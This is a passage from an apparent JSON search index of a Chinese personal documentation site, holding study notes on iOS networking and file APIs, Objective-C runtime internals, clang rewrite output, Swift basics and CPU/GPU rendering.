中“博客”、“闹钟”等的底部导航风格。\n"},{"id":279,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/9.%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%AD%98%E5%82%A8/","title":"9.网络与存储","section":"Objective-C\u0026SDK","content":"网络 #  基础知识 #   两种数据交换格式：XML、JSON（JavaScript Object Notation） 调试器：  https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx https://www.xiongdianpku.com/api/bytedance/image/list https://www.charlesproxy.com/    处理 HTTP/HTTPS 请求 #  NSURLSession #  什么是 NSURLSession？\n 本身是一个类，同时也代指一套用于处理 HTTP/HTTPS 请求的类。  关于类 NSURLSession：\n 负责管理发送和接收 HTTP 请求； 通过获取单例或传入 NSURLSessionConfiguration 创建实例； 可以通过 Block 或 delegate 接收回调；  主要有以下三种方法创建获取一个 session：\n+ (NSURLSession *)sharedSession; // 使用全局的 Cache、Cookie、证书，获取一个共享的会话。  + (NSURLSession *)sessionWithConfiguration:(NSURLSessionConfiguration *)configuration; // 通过传入一个 NSURLSessioinConfiguration（用于设置相关的参数）配置来创建相关会话。  + (NSURLSession *)sessionWithConfiguration:(NSURLSessionConfiguration *)configuration delegate:(id \u0026lt;NSURLSessionDelegate\u0026gt;)delegate delegateQueue:(NSOperationQueue *)queue; // 根据 NSURLSessionConfiguration、NSURLSessionDelegate、NSOperationQueue 三个参数创建会话。 NSURLSessionConfiguration #  上面创建方法中已经提及了这个类，它有三种类型的配置：\n default：默认配置，使用全局的 Cache、Cookie、证书； ephemeral：与默认配置类似，所有与会话相关的数据都存储在内存中； background：会话在后台上执行上传下载任务，即使应用程序本身被系统暂定或终止，传输仍然会继续。  NSURLSessionTask #  系统为不同的上传下载类型封装了不同的类，其中 NSURLSessionTask 是这些类的基类：\n NSURLSessionTask：一个抽象基类需要实现三个方法（cancel、suspend、resume）  下面我们分别介绍这个基类派生出来的几个类：\n  NSURLSessionDataTask：\nNSString *dataUrl = @\u0026#34;your_data_url\u0026#34;; NSURL *url = [NSURL URLWithString:dataUrl]; NSURLSessionTask *downloadTask = [[NSURLSession sharedSession] // 创建一个NSURLSession对象  dataTaskWithURL:url // 指定一个NSURL对象  compeletionHandler:^(NSData *data, NSURLResponse *reponse, NSError *error){}]; // 通过Block指定回调方法  [downloadTask resume];   NSURLSessionDownloadTask：下面是创建一个下载任务的示例代码：\nNSURL *url = [NSURL URLWithString:@\u0026#34;blabla\u0026#34;]; NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url]; [req setHTTPMethod:@\u0026#34;GET\u0026#34;]; NSURLSession *sharedSession = ; NSURLSessionDownloadTask *task = [[NSURLSession sharedSession] downloadTaskWithRequest:req completionHandler:^(NSURL *_Nullable location, NSURLResponse *_Nullable response, NSError *_Nullable error){ if(!error \u0026amp;\u0026amp; response \u0026amp;\u0026amp; location) // 检查是否下载成功  [self handleDownloadFile:location]; }]; 另外，下载任务一个常见的需求就是获取下载进度，这个如何实现呢？\n 使用代理，比如对于 NSURLSessionDownloadTask 可以实现 NSURLDownloadDelegate 协议。    NSURLSessionUploadTask：这个方法继承自 NSURLSessionDataTask\n  JSON 编码解码 #  在 Objetive-C 中，主要使用 NSJsonSerialization 这个类对进行字符串与 json 之间的转换：\n// JsonData ==\u0026gt; FoundationObjects + (id)JSONObjectWithData:(NSData *)data options:(NSJSONReadingOptions)opt error:(NSError **)error; // FoundationObjects ==\u0026gt; JsonData + (NSData *)dataWithJSONObjects:(id)obj options:(NSJSONWritingOptions)opt error:(NSError **)error; 其中的基类需要满足以下的要求：\n 顶层对象必须是 NSArray 或 NSDictionary； 所有对象必须是 NSString、NSNumber、NSArray、NSDictionary 或者 NULL； 所有字典的键值都是字符串类型的； 数值类型变量不能是非数值或者无穷大；  文件操作 #  Bundle #  什么是 bundle？Apple document\n bundle 是操作系统将可执行代码与相关资源整合起来，存储在文件系统中的一个文件夹； 在 iOS 或 OS X 中，应用、框架或其他软件都是 bundle。 Objective-C 中常见的 Foundation 与 Core Foundation 关键词就是用语定位和加载 bundle 资源的。  在 Objetive-C 中，通过下面的方法即可获取一个资源文件的绝对路径：\nNSBundle *main = [NSBundle mainBundle]; NSString *resourcePath = [main pathForResource:@\u0026#34;Seagull\u0026#34; ofType:@\u0026#34;jpg\u0026#34;]; 读取文件 #  iOS 中将文件分为四种文件类型，分别对应着四个不同的目录：\n  Home 目录：NSHomeDirectory()\n  Document 目录：用于保存用户生成的数据：\nNSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES); NSString *path = [paths objectAtIndex:0];   Library 目录：除 caches 之外的非用户数据：\nNSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES); NSString *path = [paths objectAtIndex:0];   Cache 目录：临时文件，这个文件夹中的文件 App 应该临时清理，存储空间不足时主动清理：\nNSArray *paths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES); NSString *path = [paths objectAtIndex:0];   文件操作 #  比如我们通过以下的代码得到了一个 FileManager：\nNSFileManager *fileManager = [NSFileManager defaultManager]; 之后我们通过以下的这些方法进行文件相关操作：\n  判断文件是否存在：\nBOOL fileExists = [fileManager fileExistsAtPath:[fileURL path]];   读取文件信息：\nNSDictionary *attr = [fileManager attributesOfItemAtPath:[fileURL path] error:\u0026amp;error];   遍历目录下的所有文件：\n[fileManager contentsOfDirectoryAtURL:bundleURL includingPropertesForKeys:@[] options:NSDirectoryEnumerationSkipsHiddenFiles error:nil];   创建目录：\n[fileManager createDirectoryAtPath:imagesPath withIntermediateDirectories:NO attribute:nil error:\u0026amp;error];   移动文件：\n[[NSFileManager defaultManager] moveItemAtURL:source toURL:destination error:\u0026amp;err];   删除文件/目录：\n[fileManager removeItemAtPath:filePath error:\u0026amp;error];   "},{"id":280,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/runtime/1.%E7%AE%80%E4%BB%8B/","title":"1.简介","section":"Runtime","content":" 参考资料：\n https://halfrost.com/objc_runtime_isa_class/ https://en.wikipedia.org/wiki/Runtime_library   简介 #  什么是 Runtime #  Runtime 顾名思义是运行时的意思，也就是指程序运行的时候。\n对于动态语言来说，通常会有很多需要运行时才可以确定的特性，比如：Objective-C 中的消息转发机制、Python 中的变量类型机制等。实现这些动态功能的函数通常被封装成一个库，称作为运行时库。\n这里要讲的 Objective-C 的 Runtime 就是 OC 的运行时库。\nObjective-C 的 Runtime #  Objective-C 有一些动态特性需要运行时库来完成：\n  类的方法调用、消息转发是间接的：传统的函数一般在编译时就已经把参数信息和函数实现打包到编译后的源码中了；在 OC 中，调用一个实例的方法，所做的是向该实例的指针发送消息，实例在收到消息后，从自身的实现中寻找响应这条消息的方法。\n  类是动态创建的：持有方法、方法实现、协议等，都是在创建的时候绑定在对象上的；\n简单的可以简化成 Runtime 管理的都是 id（id 的本质其实是 objc_object, objc_class 头部其实就是 id, 也就是isa）。\n  Objective-C 的编译运行结构大致如下：\n+--------------------------------------+ | objective-C source code | | +-------------------+-------------+ | | Framework\u0026amp;Service | Runtime API | +----+-------------------+-------------+ | compiler | +--------------------------------------+ | Runtime System Library | +--------------------------------------+ Objective-C 的代码与 Runtime 的交互发生在以下的三个情况下：\n  通过 Objective-C 源代码：所有的 Objective-C 的代码最后都会编译成运行时代码；\n  通过 Foundation 框架中 NSObject 类中定义的方法：在 OC 中，除了 NSProxy 以外，所有的类都是 NSObject 的子类，这两个类都遵循了 NSObject 协议。\n因此 NSObject 协议中的方法是所有 OC 对象的公共方法，这个协议定义在了 Public Headers/NSObject.h 这个文件中。\n  通过对Runtime 库函数的直接调用：见 官方文档。\n不过从 Xcode5 开始，苹果官方不建议直接调用 Runtime 的接口，如果需要代码补全，需要在 Xcode 中开启一个具体的设置 Enable Strict Checking of objc_msgSend Calls。\n  "},{"id":281,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/runtime/2.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"2.数据结构","section":"Runtime","content":" 参考：\n https://halfrost.com/objc_runtime_isa_class/ http://www.cocoawithlove.com/2010/01/what-is-meta-class-in-objective-c.html https://draveness.me/method-struct   NSObject #  NSObject 协议中定义的多种方法，是 OC 代码与 Runtime 发生交互的重要位置。\nNSObject 基类 #  这个类与 NSObject 协议定义在了一个文件 Public Headers/NSObjects.h 中：\nOBJC_ROOT_CLASS OBJC_EXPORT @interface NSObject \u0026lt;NSObject\u0026gt; { Class isa OBJC_ISA_AVAILABILITY; } 其中：\n  OBJC_ROOT_CLASS 是一个宏：\n#if !defined(OBJC_ROOT_CLASS) # if __has_attribute(objc_root_class) # define OBJC_ROOT_CLASS __attribute__((objc_root_class)) # else # define OBJC_ROOT_CLASS # endif #endif 它为 NSObject 这个类附加了 objc_root_class 这个属性，这是 GNU C 的特性，见：Attribute\n  OBJC_EXPORT 也是一个宏，它标记了这个类可以被任意外部位置访问到；\n  isa 是一个变量名，Class 是一个变量类型，OBJC_ISA_AVAILABILITY 也是一个宏，在 ObjC2 版本以后，isa 这个变量被标记为过期的属性，具体在 objc_object 中实现（下面详细解释）。\n  Class 与 id 的定义在 Public Headers/objc.h 这个文件中：\n#if !OBJC_TYPES_DEFINED /// An opaque type that represents an Objective-C class. typedef struct objc_class *Class; /// Represents an instance of a class. struct objc_object { Class isa OBJC_ISA_AVAILABILITY; }; /// A pointer to an instance of a class. typedef struct objc_object *id; #endif objc_class 或 Class #  这个类是所有Objective-C 类的夫类。\n在 Objc2 之前，该类的定义在 Public Headers/runtime.h 中，参考意义不大就不列举了，就是一个简单的字段组合。在 2006 年苹果公司发布 Objcive-C 2.0 之后，该类的定义在 Public Headers/objc-runtime-new.h 这个文件中：\nstruct objc_class : objc_object { // Class ISA;  Class superclass; cache_t cache; // formerly cache pointer and vtable  class_data_bits_t bits; // class_rw_t * plus custom rr/alloc flags \tclass_rw_t *data() { return bits.data(); } void setData(clas_rw_t *newData) { bits.setData(newData); } // 此处有省略一些类方法... }  superclass 是用于指向夫类的指针（NSObject 中也有一个同名的类方法）； cache 是方法缓存； class_data_bits_t 是一个封装了比特位的类，bits 是这个类对应实例的方法链表。  这个类主要封装了与面向对象相关的方法，比如继承、哈希化等。\nobjc_object 或 id #  这个类是包括 object_class 在内的所有实例对象的夫类。\n它定义在了文件 Project Headers/objc-private.h，是一个不对外暴露的私有类（对外暴露为 id）：\nstruct objc_object { private: isa_t isa; // 此处有省略一些类方法...  public: Class ISA(); Class getIsa(); } isa 这个变量是这个类最核心的功能，它用于指定实例实现的类。观察函数也会发现，它主要实现 dealloc / retain / release 等析构、初始化、内存管理相关的工作。\n小结：MetaClass #  由上面的分析我们得出一个重要的结论：Objective-C 中类也是一个对象，这个对象是单例模式。实际上这些单例模式的对象是在 main 函数执行之前，从 dyld 到 runtime 这期间创建的。\n既然 OC 类派生自 objc_object，它就一定有 isa 这个成员，那么 OC 类的 isa 指针应该指向哪里呢？\n这就牵涉到 isa 最重要的作用：消息传递。这里简单介绍一下消息传递的流程：\n 当源代码向一个对象发送消息时，会首先查找这个这个对象的 isa 参数； isa 参数指向一个类，Runtime 查找这个类的方法链表中查找并执行这个方法；  因此为了使 Objective-C 中的类也可以同样接受消息，Objective-C 将类方法分离了出去，称作元类（即 Meta Class）。Instance、Class、Meta-Class 三者的关系大致如下图：\n其中的 superclass 为 nil 的 Root class 即为 NSObject。NSObject 本质是 objc_class 这个类的单例。\nisa_t #  之前也提到了，在 Objective-C 中比较核心的 isa，它的类型为 isa_t。它的实现如下：\nunion isa_t { isa_t() { } isa_t(uintptr_t value) : bits(value) { } Class cls; uintptr_t bits; #if defined(ISA_BITFIELD)  struct { ISA_BITFIELD; }; #endif \t// 下面分别为 __arm64__ 与 __x86_64__ 定义了两个文件... } class_data_bits_t #  objc_class 的一个成员的类型为 class_data_bits_t，它的声明如下：\nstruct class_data_bits_t { // Values are the FAST_ flags above.  uintptr_t bits; private: // 一些成员方法... public: class_rw_t* data() { return (class_rw_t *)(bits \u0026amp; FAST_DATA_MASK); } void setData(class_rw_t *newData) { assert(!data() || (newData-\u0026gt;flags \u0026amp; (RW_REALIZING | RW_FUTURE))); // Set during realization or construction only. No locking needed.  bits = (bits \u0026amp; ~FAST_DATA_MASK) | (uintptr_t)newData; } // 一些成员方法... } 这个结构体只有一个 64 位的成员变量 bits。而它最重要的两个类方法也列举了出来：data、setData。\nbits 的内存布局可以用下面的示意图表示：\n is_swift：指示持有它的 objc_class 是不是一个 swift 语言的类； has_default_rr：指示持有它的 objc_class 有没有默认实现 retain/release/autorelease 等方法；  class_rw_t 与 class_ro_t #  一个 objc_class 类中的属性、方法还有遵循的协议信息都保存在了 class_rw_t 中：\nstruct class_rw_t { uint32_t flags; uint32_t version; const class_ro_t *ro; method_array_t methods; property_array_t properties; protocol_array_t protocols; Class firstSubclass; Class nextSiblingClass; }; 其中还有一个类型为 class_ro_t 指向常量的指针 ro，其中存储了当前类在编译期就已经确定的属性、方法以及遵循的协议：\nstruct class_ro_t { uint32_t flags; uint32_t instanceStart; uint32_t instanceSize; uint32_t reserved; const uint8_t * ivarLayout; const char * name; method_list_t * baseMethodList;\t// 持有这个类的 实例方法列表  protocol_list_t * baseProtocols;\t// 持有这个类的 实例协议列表  const ivar_list_t * ivars;\t// 持有这个类的 实例变量列表  const uint8_t * weakIvarLayout; property_list_t *baseProperties; };   在编译之后，class_data_bits_t.data 直接指向 class_ro_t，\n也就是说 class_ro_t 是编译时产生的；\n  在 Runtime 加载了对应的 objc_class 之后，class_data_bits_t.data 与 class_ro_t 的指向关系中插入了 class_rw_t 这个类，\n也就是说 class_rw_t 是运行时产生的；\n  iva_t \u0026amp;\u0026amp; method_t \u0026amp;\u0026amp; protocol_t #  class_rw_t 与 class_ro_t 两个类最要的三个成员变量：实例方法列表、实例协议列表、实例变量列表。\n这三个列表都是三个基本类型的列表：\n  ivar_t 表示的是一个实例变量，其关键字段是 字段起始位置的相对地址、字段名称、字段类型：\nstruct ivar_t { int32_t *offset; const char *name; const char *type; // alignment is sometimes -1; use alignment() instead  uint32_t alignment_raw; uint32_t size; uint32_t alignment() const { if (alignment_raw == ~(uint32_t)0) return 1U \u0026lt;\u0026lt; WORD_SHIFT; return 1 \u0026lt;\u0026lt; alignment_raw; } };   method_t 是表示一个实例方法，其关键字段是 方法选择器、方法名称、方法实现 三个：\nstruct method_t { SEL name; const char *types; IMP imp; struct SortBySELAddress : public std::binary_function\u0026lt;const method_t\u0026amp;, const method_t\u0026amp;, bool\u0026gt; { bool operator() (const method_t\u0026amp; lhs, const method_t\u0026amp; rhs) { return lhs.name \u0026lt; rhs.name; } }; }; 其中：\n IMP 的底层，实际上就是一个函数的地址，编译结果是 void * 类型； binary_function 是 c++ 的语言：binary_function    protocol_t 是一个协议的类型，它的结构就比较复杂了：\nstruct protocol_t : objc_object { const char *mangledName; struct protocol_list_t *protocols; method_list_t *instanceMethods; method_list_t *classMethods; method_list_t *optionalInstanceMethods; method_list_t *optionalClassMethods; property_list_t *instanceProperties; uint32_t size; // sizeof(protocol_t)  uint32_t flags; // Fields below this point are not always present on disk.  const char **extendedMethodTypes; const char *_demangledName; const char *demangledName(); const char *nameForLogging() { return demangledName(); } bool isFixedUp() const; void setFixedUp(); bool hasExtendedMethodTypesField() const { return size \u0026gt;= (offsetof(protocol_t, extendedMethodTypes) + sizeof(extendedMethodTypes)); } bool hasExtendedMethodTypes() const { return hasExtendedMethodTypesField() \u0026amp;\u0026amp; extendedMethodTypes; } };   总结：类派生图 #  上面列举的这些类，它们在代码中体现的派生结构，可以用下面的图表示：\n"},{"id":282,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/runtime/3.%E7%BC%96%E8%AF%91%E7%BB%93%E6%9E%9C/","title":"3.编译结果","section":"Runtime","content":" 参考资料：\n 深入剖析-iOS-编译-Clang\u0026mdash;LLVM https://kingcos.me/posts/2019/objects_in_obj-c/   编译结果 #  clang #  我们都知道 Objective-C 是 C++ 的超集。Objetive-C 的代码在编译阶段，先会 clang 被编译为 C++ 代码，然后在 Runtime 上运行。\n利用 clang 在命令行里编译 Objective-C 的命令：\n# ARC $ clang -fobjc-arc -framework Foundation main.m -o main # MRC $ clang -fno-objc-arc -framework Foundation main.m -o main 我们使用下面的示例程序，来查看 clang 的编译结果：\n#import \u0026lt;Foundation/Foundation.h\u0026gt;  @interface SheslClass : NSObject { NSNumber *sheslVarNumber; } @property (nonatomic, copy) NSString *sheslPropertyString; + (void)sheslClassMethod; - (NSNumber *)getSheslVarNumber; @end @implementation SheslClass + (void)sheslClassMethod { NSLog(@\u0026#34;Hello World\u0026#34;); } - (NSNumber *)getSheslVarNumber { return sheslVarNumber; } @end int main(int argc, char * argv[]) { [SheslClass sheslClassMethod]; SheslClass *sheslClass = [[SheslClass alloc] init]; return 0; } 我们可以手动将 Objetive-C 代码编译为 C++ 代码：\n$ clang -rewrite-objc main.m OC 类的实例变量 #  SheslClass 的实例变量，通过 C++ 实例 _OBJC_$_INSTANCE_VARIABLES_SheslClass 实现，它的定义如下：\nstatic struct /*_ivar_list_t*/ { unsigned int entsize; // sizeof(struct _prop_t) \tunsigned int count; struct _ivar_t ivar_list[2]; } _OBJC_$_INSTANCE_VARIABLES_SheslClass __attribute__ ((used, section (\u0026#34;__DATA,__objc_const\u0026#34;))) = { sizeof(_ivar_t), 2, { { (unsigned long int *)\u0026amp;OBJC_IVAR_$_SheslClass$sheslVarNumber, \u0026#34;sheslVarNumber\u0026#34;, \u0026#34;@\\\u0026#34;NSNumber\\\u0026#34;\u0026#34;, 3, 8 }, { (unsigned long int *)\u0026amp;OBJC_IVAR_$_SheslClass$_sheslPropertyString, \u0026#34;_sheslPropertyString\u0026#34;, \u0026#34;@\\\u0026#34;NSString\\\u0026#34;\u0026#34;, 3, 8 } } }; 我们分析其中的一个变量 sheslVarNumber：\n  可见 clang 生成了一个变量 OBJC_IVAR_$_SheslClass$sheslVarNumber 用于存储偏移的地址；\n  Objetive-C 的变量名和类型在 C++ 中都表现为字符串；\n  第一个参数存储类型为 unsigned long int * 是地址的强制类型转换，具体的类型由第三个参数确定；\n  OC 类的实例方法 #  SheslClass 的实例方法，通过 C++ 实例 _OBJC_$_INSTANCE_METHODS_SheslClass 实现，它的定义如下：\nstatic struct /*_method_list_t*/ { unsigned int entsize; // sizeof(struct _objc_method) \tunsigned int method_count; struct _objc_method method_list[3]; } _OBJC_$_INSTANCE_METHODS_SheslClass __attribute__ ((used, section (\u0026#34;__DATA,__objc_const\u0026#34;))) = { sizeof(_objc_method), 3, { { (struct objc_selector *)\u0026#34;getSheslVarNumber\u0026#34;, \u0026#34;@16@0:8\u0026#34;, (void *)_I_SheslClass_getSheslVarNumber }, { (struct objc_selector *)\u0026#34;sheslPropertyString\u0026#34;, \u0026#34;@16@0:8\u0026#34;, (void *)_I_SheslClass_sheslPropertyString }, { (struct objc_selector *)\u0026#34;setSheslPropertyString:\u0026#34;, \u0026#34;v24@0:8@16\u0026#34;, (void *)_I_SheslClass_setSheslPropertyString_ } } }; 我们分析其中的第一个变量 getSheslVarNumber：\n 在 Runtime 中，第一个参数类型为 SEL，它底层是通过 C++ 的 objc_selector 这个结构实现的 第二个参数则是方法的类型，字符串的内容看起来是一串神秘的编码，它叫做方法类型编码；这个编码由一个类型与一个字节数构成。比如上面的 @16@:8：  @16 表示这个方法的返回值，是一个 16 个字节的对象； @0 与 :8 是每个选择器都会有的参数，即 id self \u0026amp; SEL op。    "},{"id":283,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/runtime/swizzling/","title":"Swizzling","section":"Runtime","content":"Method Swizzling #  "},{"id":284,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/swiftsdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"1.基本语法","section":"Swift\u0026SDK","content":"基本语法 #  符号概念 #  引入 #  Swift 中的引入关键字是 import。\n值得注意的是，这个语句可以用来引入任何 Objective-C/C 的库到 Swift 程序中来。\n分号 #  Swift 不要求在每行语句的结尾使用分号。\n但当你在同一行书写多条语句时，必须用分号隔开。\n空格 #  Swift 并不是像 C/C++，Java 那样完全忽视空格，Swift 对空格的使用有一定的要求，但是又不像 Python 对缩进的要求那么严格。\n在 Swift 中，运算符不能直接跟在变量或常量的后面。例如下面的代码会报错：\n/// error: prefix/postfix \u0026#39;=\u0026#39; is reserved let a= 1 + 2 /// error: consecutive statements on a line must be separated by \u0026#39;;\u0026#39; let a = 1+ 2 第二个报错比较奇怪，这是因为Swift认为到1+这个语句就结束了，2就是下一个语句了。只有这样写才不会报错：\nlet a = 1 + 2; // 编码规范推荐使用这种写法 let b = 3+4 // 这样也是OK的 数据类型 #  数据类型基础 #  内置数据类型：语言中内置了以下的几种数据类型：\n 整数/无符号整数：Int/Uint； 浮点数：Double/Float； 布尔值：Bool； 字符串/字符：String/Character； 可选类型：Optional。表示有值或没有值的情况；  类型别名：可以用下面的语法定义类型别名：\ntypealias newname = type 类型安全：\n Swift 是一个类型安全（type safe）的语言。 由于 Swift 是类型安全的，所以它会在编译你的代码时进行类型检查（type checks），并把不匹配的类型标记为错误。  类型推断：\n 如果你没有显式指定类型，Swift 会使用类型推断（type inference）来选择合适的类型； 通过类型推断声明变量类型的关键词是 let、var；  变量声明：\nvar variableName1 = \u0026lt;initial value\u0026gt; var variableName2 : \u0026lt;variable type\u0026gt; 可选类型 #  Optional 的数据类型有以下两种声明方式，是等价的：\nvar optionalInteger: Int? var optionalInteger: Optional\u0026lt;Int\u0026gt; Optional 是一个含有两种情况的枚举，None 和 Some(T)，用来表示可能有或可能没有值。\n可选类型中的 nil 类型，类似于 Objective-C 中指针的 nil 值，但是 nil 只对类有用，而可选类型对所有的类型都可用，并且更安全。\n强制解析：\n 当你确定可选类型确实包含值之后，你可以在可选的名字后面加一个感叹号（!）来获取值。这个感叹号表示\u0026quot;我知道这个可选有值，请使用它。\u0026quot; 这被称为可选值的强制解析（forced unwrapping）。  自动解析：\n 可选变量在声明的时候使用 ! 而不是 ?，这样变量就会自动解析。  下面是一个实例程序以及输出内容：\nvar optionalInteger1: Int? = 1024 var optionalInteger2: Int? print(optionalInteger1) // Optional(1024) print(optionalInteger1!) // 1024 print(optionalInteger2) // nil print(optionalInteger2!) // Fatal error: Unexpectedly found nil while unwrapping an Optional value 可选绑定：\n 使用可选绑定（optional binding）来判断可选类型是否包含值，如果包含就把值赋给一个临时常量或者变量。 可选绑定可以用在 if 和 while 语句中来对可选类型的值进行判断并把值赋给一个常量或者变量。  下面是一个使用可选绑定的例子：\nif let constantName = someOptional { \u0026lt;statements\u0026gt; } 常量/变量/字面量 #  常量用 let 声明，变量用 var 声明。\n字面量同 C++，布尔值除了 true/false 还有 nil 作为第三个值。\n控制流 #  运算符 #  除了 C++ 中已经有的 “算术运算符”、“比较运算符”、“逻辑运算符”、“位运算符”、“赋值运算符” 之外，Swift 中提供了一个特殊的运算符 “区间运算符”。\nSwift 提供了两个区间的运算符。\n   运算符 实例     闭区间运算符 1\u0026hellip;5 区间值为 1, 2, 3, 4 和 5   半开区间运算符（左闭右开） 1..\u0026lt; 5 区间值为 1, 2, 3, 和 4    以下为区间运算的简单实例：\nimport Cocoa print(\u0026#34;闭区间运算符:\u0026#34;) for index in 1...5 { print(\u0026#34;\\(index)* 5 = \\(index * 5)\u0026#34;) } print(\u0026#34;半开区间运算符:\u0026#34;) for index in 1..\u0026lt;5 { print(\u0026#34;\\(index)* 5 = \\(index * 5)\u0026#34;) } 条件语句 #  if；else；三元运算。\n循环语句 #  除了 for-in/for/while/repeat...while/switch...case 之外。\nSwift 针对 switch 提供了一个 fallthrough 关键词作为优化：\n Swift 的 switch 语句中的一个 case 执行完之后，默认会结束语句块； 若想要继续执行下面的 case，需要用 fallthrough 语句继续后面的流程；  "},{"id":285,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/swiftsdk/2.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/","title":"2.内置类型","section":"Swift\u0026SDK","content":"内置类型 #  字符串 #  Swift 字符串是一系列字符的集合。例如 \u0026ldquo;Hello, World!\u0026rdquo; 这样的有序的字符类型的值的集合，它的数据类型为 String。\n字符串内嵌变量：\nimport Cocoa var varA = 20 let constA = 100 var varC:Float = 20.0 var stringA = \u0026#34;\\(varA)乘于 \\(constA)等于 \\(varC * 100)\u0026#34; 字符串判空：String.isEmpty：\n字符串连接：+\n字符串长度：Swift2: String.count; Swift3: String.characters.count\n字符串比较：==\n字符串分割（python 中的 split）：\nlet fullName = \u0026#34;First Last\u0026#34; let fullNameArr = fullName.characters.split{$0 == \u0026#34; \u0026#34;}.map(String.init) 字符 #  数据类型为 Character。\n遍历字符串中的字符：\n// swift 3 for ch in \u0026#34;Runoob\u0026#34;.characters { print(ch) } // swift 4 for ch in \u0026#34;Runoob\u0026#34; { print(ch) } 字符串后拼接字符：append()；\n数组 #  Swift 数组使用有序列表存储同一类型的多个值。类型声明方式 [SomeType]。\n创建数组：\n// 不推荐的方式 var someArray = [SomeType]() var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements) // 推荐的方式 var someArray: [SomeType] = [] var someArray: [SomeType: Int] = [:] 访问数组：someArray[index]；\n修改数组：append(ele)/+=/arr[ind] = val；\n遍历数组：for in/enumerate()；\n合并数组：+；\n数组长度：Array.count；\n数组判空：Array.isEmpty；\n数组字面量：[10, 20, 30]；\n字典 #  Swift 字典每个值（value）都关联唯一的键（key），键作为字典中的这个值数据的标识符。\n创建字典：[KeyType: ValueType]()\n访问字典：someDict[key]\n修改字典：\n 可以使用 updateValue(forKey:) 增加或更新字典的内容； 也可以用传统的方法：someDict[ind] = newVal；  移除键值：\n removeValueForKey() 方法来移除字典 key-value 对。如果 key 存在该方法返回移除的值，如果不存在返回 nil； 也可以通过指定键的值为 nil 来移除 key-value（键-值）对。  遍历字典：for (key, value) in someDict；\n键值数组：.keys/.values；\n键值数量：.count；\n字典判空：.isEmpty；\n"},{"id":286,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/swiftsdk/3.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%BB%93%E6%9E%84/","title":"3.函数与结构","section":"Swift\u0026SDK","content":"函数与结构 #  函数 #  Swift 使用一个统一的语法来表示简单的 C 语言风格的函数到复杂的 Objective-C 语言风格的方法。\n函数定义：func\nfunc runoob(site: String) -\u0026gt; String { return (site) } 函数调用：\nprint(runoob(site: \u0026#34;www.runoob.com\u0026#34;)) 函数参数：\n 参数被包含在函数的括号之中，以逗号分隔。 函数参数都有一个外部参数名（外部调用时指定）和一个局部参数名（内部使用时使用），比如：  func test(firstArg a: Int, secondArg b: Int) -\u0026gt; Int { var res = a print(b) return a; } test(firstArg:5, secondArg:3)  使用 inout 关键字定义，使用 \u0026amp; 调用，可以传递引用参数。如果缺少 \u0026amp; 会报错类型不符，如果缺少 inout 会报错将 var 赋值给 let。例子：  func swapTwoInts(_ a: inout Int, _ b: inout Int) { let temporaryA = a a = b b = temporaryA } swapTwoInts(\u0026amp;x, \u0026amp;y) 返回元组：\nfunc minMax(array: [Int]) -\u0026gt; (min: Int, max: Int) { // ... } if let bounds = minMax(array: [8, -6, 2, 109, 3, 71]) { print(\u0026#34;最小值为 \\(bounds.min)，最大值为 \\(bounds.max)\u0026#34;) } 函数类型：(SomeType) -\u0026gt; SomeType \n闭包 #  Swift 中的闭包与 C 和 Objective-C 中的代码块（blocks）以及其他一些编程语言中的 匿名函数比较相似。\n"},{"id":287,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/swiftsdk/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","title":"问题记录","section":"Swift\u0026SDK","content":"问题记录 #   可选项遵照 LogicValue 协议，因此可以出现在布尔环境中。在这种情况下，如果可选类型 T? 包含类型为 T 的任何值（也就是说它的值是 Optional.Some(T) ），这个可选类型等于 true，反之为 false； 没看出来 ! 声明与 ? 声明的区别； 创建数组的两种方式的差异； 字典的底层实现；  "},{"id":288,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/cpugpu/","title":"Cpu\u0026 Gpu","section":"性能优化","content":" 参考：\n https://juejin.im/post/5ace078cf265da23994ee493#heading-2 https://www.zhihu.com/question/29163054 https://www.jianshu.com/p/f62e81b72bba   CPU \u0026amp; GPU #  图形学概念 #  光栅化（Rasterize / Rasteriztion）：\n 就是把矢量图形转化成像素点儿的过程。  着色器（Shader），通常着色器分两种：\n 顶点着色器（vertex shader）：这个是告诉电脑如何打线稿的——如何处理顶点、法线等的数据的小程序。 片面着色器（fragment shader）：这个是告诉电脑如何上色的——如何处理光、阴影、遮挡、环境等等对物体表面的影响，最终生成一副图像的小程序。  二者功能 #  CPU 的职能：\n 加载资源，对象创建，对象调整，对象销毁，布局计算，Autolayout，文本计算，文本渲染； 图片的解码， 图像的绘制（Core Graphics）都是在CPU上面进行的。  GPU 的特点：\n GPU 是一个专门为图形高并发计算而量身定做的处理单元，比 CPU 使用更少的电来完成工作并且 GPU 的浮点计算能力要超出 CPU 很多。 GPU 的渲染性能要比 CPU 高效很多，同时对系统的负载和消耗也更低一些，所以在开发中，我们应该尽量让 CPU 负责主线程的 UI 调动，把图形显示相关的工作交给 GPU 